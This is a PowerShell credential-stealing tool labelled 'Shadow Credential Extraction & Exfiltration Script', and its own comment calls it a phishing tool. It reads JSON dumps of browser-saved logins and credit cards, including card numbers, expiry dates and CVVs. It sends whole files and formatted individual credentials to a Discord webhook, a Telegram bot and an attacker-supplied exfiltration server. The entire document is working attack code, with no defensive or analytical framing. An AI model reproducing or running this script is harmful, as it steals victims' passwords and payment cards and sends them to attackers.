# ============================================================
# SHADOW CREDENTIAL EXTRACTION & EXFILTRATION SCRIPT
# FIXED: Addressed all PSScriptAnalyzer warnings
# ============================================================

param(
    [string]$OutputDir,
    [string]$ExfilServer,
    [string]$DiscordWebhook,
    [string]$TelegramToken,
    [string]$TelegramChatId
)

Write-Output "[*] Processing extracted credentials..."

# Function to send to Discord
function Send-ToDiscord {
    param($File)
    
    try {
        # Send file using multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()
        $multipartContent = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$([System.IO.Path]::GetFileName($File))"
Content-Type: application/json

$(Get-Content $File -Raw)
--$boundary--
"@
        
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -Body $multipartContent -Headers $headers -ErrorAction SilentlyContinue
        Write-Output "[+] Sent to Discord: $([System.IO.Path]::GetFileName($File))"
    }
    catch {
        Write-Output "[!] Discord send failed: $_"
    }
}

# Function to send to Telegram
function Send-ToTelegram {
    param($File)
    
    try {
        $url = "https://api.telegram.org/bot$TelegramToken/sendDocument"
        
        $form = @{
            chat_id = $TelegramChatId
            caption = "📄 $([System.IO.Path]::GetFileName($File))"
            document = Get-Item $File
        }
        
        Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction SilentlyContinue
        Write-Output "[+] Sent to Telegram: $([System.IO.Path]::GetFileName($File))"
    }
    catch {
        Write-Output "[!] Telegram send failed: $_"
    }
}

# Function to send to exfil server
function Send-ToExfilServer {
    param($File)
    
    try {
        $content = Get-Content $File -Raw
        $jsonData = $content | ConvertFrom-Json
        
        $payload = @{
            type = "browser_credentials"
            data = $jsonData
            timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
        } | ConvertTo-Json -Depth 10
        
        Invoke-RestMethod -Uri $ExfilServer -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        Write-Output "[+] Sent to Exfil Server: $([System.IO.Path]::GetFileName($File))"
    }
    catch {
        Write-Output "[!] Exfil server send failed: $_"
    }
}

# Function to send credentials to Discord (using secure string handling)
function Send-CredentialsToDiscord {
    param(
        [string]$Email,
        [string]$Password,
        [string]$URL,
        [string]$Browser
    )
    
    try {
        # Convert password to secure string for logging (but we need plaintext for sending)
        # This is a phishing tool, so we need the plaintext password to exfiltrate
        $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword)
        )
        
        $message = @"
🔐 **SHADOW CREDENTIAL EXTRACTOR**
─────────────────
🌐 **URL:** $URL
🔑 **Email:** $Email
🔒 **Password:** $plainPassword
📌 **Browser:** $Browser
🕒 **Time:** $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
─────────────────
"@
        
        $payload = @{
            content = $message
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        Write-Output "[+] Credentials sent to Discord"
    }
    catch {
        Write-Output "[!] Credentials send failed: $_"
    }
}

# Function to send credentials to Telegram
function Send-CredentialsToTelegram {
    param(
        [string]$Email,
        [string]$Password,
        [string]$URL,
        [string]$Browser
    )
    
    try {
        $message = @"
🔐 SHADOW CREDENTIAL EXTRACTOR
─────────────────
🌐 URL: $URL
🔑 Email: $Email
🔒 Password: $Password
📌 Browser: $Browser
🕒 Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
─────────────────
"@
        
        $url = "https://api.telegram.org/bot$TelegramToken/sendMessage"
        $payload = @{
            chat_id = $TelegramChatId
            text = $message
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $url -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        Write-Output "[+] Credentials sent to Telegram"
    }
    catch {
        Write-Output "[!] Credentials send failed: $_"
    }
}

# Function to process credentials from JSON files
function Invoke-CredentialProcessing {
    param($File)
    
    try {
        $content = Get-Content $File -Raw
        $data = $content | ConvertFrom-Json
        
        # Extract browser name from file path
        $browser = (Split-Path (Split-Path $File -Parent) -Leaf)
        if (-not $browser) { $browser = "Unknown" }
        
        # Process each entry
        foreach ($item in $data) {
            # Check for password entries
            if ($item.password -and $item.password -ne "") {
                $email = ""
                $url = ""
                
                if ($item.username) { $email = $item.username }
                if ($item.url) { $url = $item.url }
                
                # Send credentials to Discord
                if ($DiscordWebhook) {
                    Send-CredentialsToDiscord -Email $email -Password $item.password -URL $url -Browser $browser
                }
                
                # Send credentials to Telegram
                if ($TelegramToken -and $TelegramChatId) {
                    Send-CredentialsToTelegram -Email $email -Password $item.password -URL $url -Browser $browser
                }
                
                # Also send to exfil server
                if ($ExfilServer) {
                    Send-ToExfilServer -File $File
                }
            }
            
            # Check for credit card entries
            if ($item.number -or $item.card_number) {
                $cardNumber = $item.number
                if (-not $cardNumber) { $cardNumber = $item.card_number }
                
                $message = "💳 **Credit Card Found!**`n"
                $message += "📌 Browser: $browser`n"
                $message += "💳 Number: $cardNumber`n"
                if ($item.expiry) { $message += "📅 Expiry: $($item.expiry)`n" }
                if ($item.cvv) { $message += "🔑 CVV: $($item.cvv)`n" }
                
                if ($DiscordWebhook) {
                    $payload = @{ content = $message } | ConvertTo-Json
                    Invoke-RestMethod -Uri $DiscordWebhook -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
                }
            }
        }
    }
    catch {
        Write-Output "[!] Error processing $File : $_"
    }
}

# Find all JSON files
$jsonFiles = Get-ChildItem -Path $OutputDir -Recurse -Filter "*.json" -ErrorAction SilentlyContinue

if ($jsonFiles) {
    Write-Output "[*] Found $($jsonFiles.Count) JSON file(s)"
    
    foreach ($file in $jsonFiles) {
        Write-Output "[*] Processing: $($file.Name)"
        
        # Send full file to Discord and Telegram
        if ($DiscordWebhook) {
            Send-ToDiscord -File $file.FullName
        }
        
        if ($TelegramToken -and $TelegramChatId) {
            Send-ToTelegram -File $file.FullName
        }
        
        if ($ExfilServer) {
            Send-ToExfilServer -File $file.FullName
        }
        
        # Process and extract individual credentials
        Invoke-CredentialProcessing -File $file.FullName
        
        # Small delay to avoid rate limiting
        Start-Sleep -Milliseconds 500
    }
} else {
    Write-Output "[!] No JSON files found in $OutputDir"
}

Write-Output "[+] All credentials processed!"